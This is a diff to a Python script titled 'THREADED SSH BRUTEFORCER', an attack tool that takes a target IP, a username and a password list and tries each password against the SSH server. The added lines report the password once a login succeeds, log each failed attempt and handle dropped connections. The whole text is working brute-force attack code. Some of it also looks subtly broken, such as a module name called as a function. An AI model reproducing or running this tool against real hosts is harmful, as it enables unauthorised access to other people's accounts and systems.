@@ -9,6 +9,7 @@ print("------------| PROJECT - 2 | THREADED SSH BRUTEFORCER | BY TANISH CHOUDHAR
 host = input("[-|-] ENTER IP [-|-] :  ") # Target Address
 username = input("[-|-] SSH USERNAME [-|-] : ") # SSH Username
 input_file = input("[-|-] PASSWORD FILE [-|-] : ") # Passwords File
+print('\n')
 
 # FILE PATH VERIFICATION
 if  os.path.exists(input_file) == False:
@@ -38,6 +39,15 @@ with open(input_file, 'r') as file:
         password = line.strip() # Seperating Passwords from lines
         try:
             response = ssh_connect(password)
-        except:
-            print
+            if response == 0:
+                print(termcolor(("[-|-] PASSWORD FOUND : " + password + " FOR USERNAME" + username), 'green'))
+                break
+            elif response == 1:
+                print("[-|-] INCORRECT LOGIN WITH : " + password)
+            elif response == 2:
+                print("[-|-] CONNECTION CLOSED ")
+                sys.exit(1)
+        except Exception as e:
+            print(e)
+            pass
             
